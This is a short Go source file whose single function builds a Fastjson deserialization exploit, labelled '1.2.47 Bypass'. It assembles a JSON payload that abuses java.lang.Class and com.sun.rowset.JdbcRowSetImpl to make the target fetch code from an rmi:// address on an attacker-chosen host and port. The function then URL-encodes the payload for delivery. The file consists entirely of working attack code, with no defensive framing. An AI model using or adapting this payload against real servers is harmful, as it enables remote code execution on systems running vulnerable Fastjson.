package main

import (
	"fmt"
	"net/url"
)

func getPayload(host string, port int) string {
	// 1.2.47 Bypass
	payload := "{\n" +
		"    \"a\":{\n" +
		"        \"@type\":\"java.lang.Class\",\n" +
		"        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n" +
		"    },\n" +
		"    \"b\":{\n" +
		"        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +
		"        \"dataSourceName\":\"rmi://%s:%d/Exploit\",\n" +
		"        \"autoCommit\":true\n" +
		"    }\n" +
		"}"
	payload = fmt.Sprintf(payload, host, port)
	payload = url.QueryEscape(payload)
	return payload
}
